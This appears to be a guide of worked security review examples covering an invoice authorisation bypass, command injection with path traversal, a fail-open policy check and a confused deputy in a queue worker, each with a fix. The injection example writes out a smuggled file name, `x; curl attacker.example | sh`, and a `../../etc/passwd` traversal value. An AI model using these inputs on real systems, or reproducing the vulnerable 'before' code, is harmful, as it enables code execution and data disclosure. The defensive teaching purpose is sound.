# Security review examples

These show the voice and the move that matters: name the weakness, trace the path from an entry point to what the attacker gains, then show the fix as code or as an interface that makes the safe path the only path. Each example is small so the shape is visible. On a real codebase the same moves apply across modules. Match this register: blunt, specific, every finding tied to a gain and a path, and a Must, Ought, or Should on each.

## Example 1: authorisation bypass through a user-controlled key

**Before:**

```python
@app.get("/invoices/<int:invoice_id>")
@login_required
def show_invoice(invoice_id: int):
    invoice = Invoice.query.get_or_404(invoice_id)
    return render_template("invoice.html", invoice=invoice)
```

**Review (Must):**

The route is authenticated and unauthorised. Any logged-in user can read any invoice by changing the number in the URL, and the ids are sequential, so enumerating every invoice in the system is a loop. Path: log in with a free account, request `/invoices/1` upward. Gain: disclosure of every customer's billing data. This is CWE-639, authorisation bypass through a user-controlled key, and the top category in the OWASP Top 10 for a reason: the check that is missing here is the one every handler has to remember.

Adding an `if invoice.account_id != current_user.account_id: abort(403)` line fixes this route and leaves the next route to make the same mistake. The fix that holds is to make the lookup itself scoped, so a handler cannot forget.

**The two interfaces side by side:**

```
Before (every handler must remember):     After (the lookup cannot forget):
  - fetch the object by id                  - invoices_for(current_user).get_or_404(id)
  - compare its owner with the principal
  - abort if they differ
```

**After:**

```python
def invoices_for(user: User) -> Query:
    """Invoices the user may see. Nothing outside this scope resolves."""
    return Invoice.query.filter_by(account_id=user.account_id)


@app.get("/invoices/<int:invoice_id>")
@login_required
def show_invoice(invoice_id: int):
    invoice = invoices_for(current_user).get_or_404(invoice_id)
    return render_template("invoice.html", invoice=invoice)
```

An id outside the user's account now returns 404, which also stops the enumeration from confirming which ids exist. Every other invoice route uses the same scoped query, so the check lives in one place. As a Should: expose random ids instead of sequential ones, so a guessed URL names nothing.

## Example 2: command injection and path traversal in one function

**Before:**

```python
UPLOAD_DIR = "/srv/uploads"
OUTPUT_DIR = "/srv/converted"


def convert(upload_name: str, fmt: str) -> str:
    src = os.path.join(UPLOAD_DIR, upload_name)
    dst = os.path.join(OUTPUT_DIR, f"{upload_name}.{fmt}")
    os.system(f"convert {src} {dst}")
    return dst
```

**Review (Must):**

Five lines, three weaknesses, all reachable by whoever controls `upload_name` and `fmt`, which is the uploader. `os.system` hands the whole string to a shell, so an upload named `x; curl attacker.example | sh` runs the attacker's command as the service: CWE-78, code execution. `os.path.join` passes `..` through and discards the base when the name is absolute, so `../../etc/passwd` reads outside the upload directory and `dst` writes outside the output directory: CWE-22. And the output name is attacker-chosen, so a name ending in `.py` dropped into a directory something later imports is code execution by a second route.

The shape of the fix is the same for all three: the attacker's strings stop being paths and stop being commands. Names are generated by the server. Paths are resolved and checked against the base. The command is an argument list.

**After:**

```python
UPLOAD_DIR = Path("/srv/uploads").resolve()
OUTPUT_DIR = Path("/srv/converted").resolve()
ALLOWED_FORMATS = {"png", "jpg", "webp"}


def convert(upload_id: str, fmt: str) -> Path:
    if fmt not in ALLOWED_FORMATS:
        raise ValueError(f"unsupported format: {fmt}")
    src = (UPLOAD_DIR / upload_id).resolve()
    if not src.is_relative_to(UPLOAD_DIR):
        raise ValueError("upload id resolves outside the upload directory")
    dst = OUTPUT_DIR / f"{secrets.token_urlsafe(16)}.{fmt}"
    subprocess.run(["convert", str(src), str(dst)], check=True, timeout=60)
    return dst
```

`upload_id` is the server-generated name the upload was stored under, so the resolved-path check is defence in depth rather than the only line. `fmt` comes from an allowlist, and the allowlist is what makes the format safe to put in a filename. The argument list means a name with a semicolon is a name with a semicolon. The timeout is the Should that came free: an image crafted to make the converter spin now fails after a minute instead of holding the worker.

## Example 3: a security check that fails open

**Before:**

```python
def is_allowed(user: User, action: str, resource: Resource) -> bool:
    try:
        return policy_service.check(user.id, action, resource.id)
    except (Timeout, ConnectionError):
        log.warning("policy service unavailable, allowing %s", action)
        return True


# every caller:
if not is_allowed(current_user, "delete", doc):
    abort(403)
delete(doc)
```

**Review (Must):**

When the policy service is slow or down, every action is allowed. That is a design decision, and the log line shows it was deliberate: availability was chosen over authorisation. Path: make the policy service time out, by load or by a request crafted to be slow, then do anything. Gain: elevation of privilege across the whole application at once. CWE-636, failing open, and the OWASP Top 10 has a category for exactly this kind of exceptional-condition handling.

There is a second, quieter problem in the interface. The function returns a boolean, so every caller has to remember to test it and to test it the right way round. One caller that writes `if is_allowed(...)` with the branches swapped, or forgets the check, is the next finding.

**After:**

```python
class PolicyUnavailable(Exception):
    """The policy service could not answer. Callers map this to 503."""


def require(user: User, action: str, resource: Resource) -> None:
    """Return normally only when user may perform action on resource."""
    try:
        allowed = policy_service.check(user.id, action, resource.id)
    except (Timeout, ConnectionError) as e:
        raise PolicyUnavailable(action) from e
    if not allowed:
        raise Forbidden(action)


# every caller:
require(current_user, "delete", doc)
delete(doc)
```

Unavailable now means unavailable, and the application answers 503 instead of yes. The function raises instead of returning, so a caller cannot forget the check or invert it: the only way past `require` is to be allowed. If the product genuinely needs to keep working through a policy outage, that is a decision for the designer, and the place to make it is a cached decision with a short lifetime, never a default of allow.

## Example 4: a confused deputy behind a queue

**Before:**

```python
# api.py
@app.post("/exports")
@login_required
def request_export():
    body = request.get_json()
    queue.send({"account_id": body["account_id"], "email": body["email"]})
    return "", 202


# worker.py, running with the service's own database credentials
def handle(msg: dict) -> None:
    rows = db.query(
        "SELECT * FROM records WHERE account_id = %s", (msg["account_id"],)
    )
    send_csv(msg["email"], rows)
```

**Review (Must):**

The API handler is a confused deputy. It is authenticated, and it passes on whatever account id the caller typed, and the worker then exports that account with the service's own authority. The user's identity is dropped at the queue. Path: log in as anyone, post `{"account_id": <someone else>, "email": "attacker@example.com"}`. Gain: disclosure of any account's records, delivered by email to an address of the attacker's choosing. CWE-441 in the deputy and CWE-639 in the key.

The query is parameterised, so this is a good example of how a weakness survives a review that looks for dangerous calls. There are none. The weakness is in what the message carries: the wrong account id and no principal.

**After:**

```python
# api.py
@app.post("/exports")
@login_required
def request_export():
    queue.send({"requested_by": current_user.id})
    return "", 202


# worker.py
def handle(msg: dict) -> None:
    user = User.get(msg["requested_by"])
    require(user, "export", Account.get(user.account_id))
    rows = db.query(
        "SELECT * FROM records WHERE account_id = %s", (user.account_id,)
    )
    send_csv(user.email, rows)
```

The account and the destination now come from the principal, and the worker authorises as that principal at the point of action rather than trusting that the API did. One condition makes this hold: the queue is writable only by the API. If anything else can enqueue a message, `requested_by` is a claim rather than a fact, and the message needs a signature the worker checks first. That is a question for the designer, and it is the kind of thing to ask rather than assume.
